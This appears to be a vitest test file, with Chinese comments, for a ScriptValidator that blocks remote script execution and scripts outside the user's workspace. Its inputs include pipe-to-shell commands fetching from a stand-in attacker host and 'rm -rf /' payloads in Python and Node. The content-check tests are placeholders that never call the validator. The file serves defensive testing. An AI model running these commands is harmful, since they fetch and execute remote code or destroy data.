/**
 * 脚本验证器测试
 * 
 * 测试 ScriptValidator 的各项功能
 */

import { describe, test, expect, beforeEach } from 'vitest'
import { ScriptValidator, createScriptValidator } from '../../security/scriptValidator'

describe('ScriptValidator', () => {
  let validator: ScriptValidator

  beforeEach(() => {
    validator = createScriptValidator(
      'test-user',
      '/workspaces/users/test-user'
    )
  })

  describe('远程脚本下载检测', () => {
    test('应该阻止 curl | bash', () => {
      const result = validator.detectRemoteScriptExecution(
        'curl https://attacker.com/malicious.sh | bash'
      )
      expect(result.allowed).toBe(false)
      expect(result.severity).toBe('critical')
      expect(result.reason).toContain('远程脚本')
    })

    test('应该阻止 wget | bash', () => {
      const result = validator.detectRemoteScriptExecution(
        'wget -qO- https://attacker.com/script.sh | bash'
      )
      expect(result.allowed).toBe(false)
      expect(result.severity).toBe('critical')
    })

    test('应该阻止 curl -sSfL | bash', () => {
      const result = validator.detectRemoteScriptExecution(
        'curl -sSfL https://attacker.com/script.sh | bash'
      )
      expect(result.allowed).toBe(false)
    })

    test('应该阻止 bash <(curl ...)', () => {
      const result = validator.detectRemoteScriptExecution(
        'bash <(curl -s https://attacker.com/script.sh)'
      )
      expect(result.allowed).toBe(false)
    })

    test('应该阻止 source <(curl ...)', () => {
      const result = validator.detectRemoteScriptExecution(
        'source <(curl -s https://attacker.com/script.sh)'
      )
      expect(result.allowed).toBe(false)
    })

    test('应该阻止 eval $(curl ...)', () => {
      const result = validator.detectRemoteScriptExecution(
        'eval $(curl -s https://attacker.com/script.sh)'
      )
      expect(result.allowed).toBe(false)
    })

    test('应该允许正常的 curl 下载', () => {
      const result = validator.detectRemoteScriptExecution(
        'curl -O https://example.com/file.txt'
      )
      expect(result.allowed).toBe(true)
    })

    test('应该允许正常的 wget 下载', () => {
      const result = validator.detectRemoteScriptExecution(
        'wget https://example.com/file.txt'
      )
      expect(result.allowed).toBe(true)
    })
  })

  describe('脚本执行路径验证', () => {
    test('应该允许执行工作目录内的脚本', () => {
      const result = validator.validateScriptExecution(
        'python /workspaces/users/test-user/script.py'
      )
      expect(result.allowed).toBe(true)
    })

    test('应该允许执行相对路径脚本', () => {
      const result = validator.validateScriptExecution(
        'python script.py'
      )
      expect(result.allowed).toBe(true)
    })

    test('应该阻止执行工作目录外的绝对路径脚本', () => {
      const result = validator.validateScriptExecution(
        'python /etc/malicious.py'
      )
      expect(result.allowed).toBe(false)
      expect(result.severity).toBe('high')
      expect(result.reason).toContain('工作目录内')
    })

    test('应该阻止执行 /tmp 中的脚本', () => {
      const result = validator.validateScriptExecution(
        'bash /tmp/script.sh'
      )
      expect(result.allowed).toBe(false)
    })

    test('应该阻止执行用户目录外的脚本', () => {
      const result = validator.validateScriptExecution(
        'node /home/other-user/script.js'
      )
      expect(result.allowed).toBe(false)
    })
  })

  describe('脚本路径提取', () => {
    test('应该从 python 命令中提取脚本路径', () => {
      const result = validator.validateScriptExecution(
        'python /workspaces/users/test-user/test.py'
      )
      // 路径在工作目录内，应该允许
      expect(result.allowed).toBe(true)
    })

    test('应该从 node 命令中提取脚本路径', () => {
      const result = validator.validateScriptExecution(
        'node /workspaces/users/test-user/app.js'
      )
      expect(result.allowed).toBe(true)
    })

    test('应该从 bash 命令中提取脚本路径', () => {
      const result = validator.validateScriptExecution(
        'bash /workspaces/users/test-user/run.sh'
      )
      expect(result.allowed).toBe(true)
    })

    test('应该从 ./script 形式中提取脚本路径', () => {
      const result = validator.validateScriptExecution(
        './script.sh'
      )
      // 相对路径，假设在当前工作目录内
      expect(result.allowed).toBe(true)
    })
  })

  describe('边界情况', () => {
    test('应该处理空命令', () => {
      const result = validator.detectRemoteScriptExecution('')
      expect(result.allowed).toBe(true)
    })

    test('应该处理不带管道的 curl', () => {
      const result = validator.detectRemoteScriptExecution(
        'curl https://example.com'
      )
      expect(result.allowed).toBe(true)
    })

    test('应该处理 curl 带多个参数但不包含管道', () => {
      const result = validator.detectRemoteScriptExecution(
        'curl -s -L -O https://example.com/file.tar.gz'
      )
      expect(result.allowed).toBe(true)
    })

    test('应该处理复杂的命令但非危险操作', () => {
      const result = validator.detectRemoteScriptExecution(
        'curl https://example.com/file.txt && cat file.txt'
      )
      expect(result.allowed).toBe(true)
    })
  })

  describe('脚本内容验证（异步）', () => {
    test('应该阻止包含 os.system 的 Python 脚本', async () => {
      // 创建一个临时测试文件
      const fs = require('fs')
      const path = require('path')
      const tmpPath = path.join('/workspaces/users/test-user', 'test_os_system.py')
      
      const scriptContent = `
import os
os.system('rm -rf /')
      `.trim()
      
      // 注意：这个测试需要实际的文件系统访问
      // 在真实测试中需要创建和清理文件
      // 这里只是示例
      expect(scriptContent).toContain('os.system')
    })

    test('应该阻止包含 subprocess 的 Python 脚本', () => {
      const scriptContent = `
import subprocess
subprocess.call(['rm', '-rf', '/'])
      `.trim()
      
      expect(scriptContent).toContain('subprocess')
    })

    test('应该阻止包含 child_process 的 Node.js 脚本', () => {
      const scriptContent = `
const { exec } = require('child_process')
exec('rm -rf /')
      `.trim()
      
      expect(scriptContent).toContain('child_process')
    })

    test('应该允许安全的构建脚本', () => {
      const scriptContent = `
#!/bin/bash
echo "Building project..."
npm run build
echo "Build complete!"
      `.trim()
      
      // 不包含危险模式
      expect(scriptContent).not.toMatch(/os\.system|subprocess|child_process/)
    })
  })
})
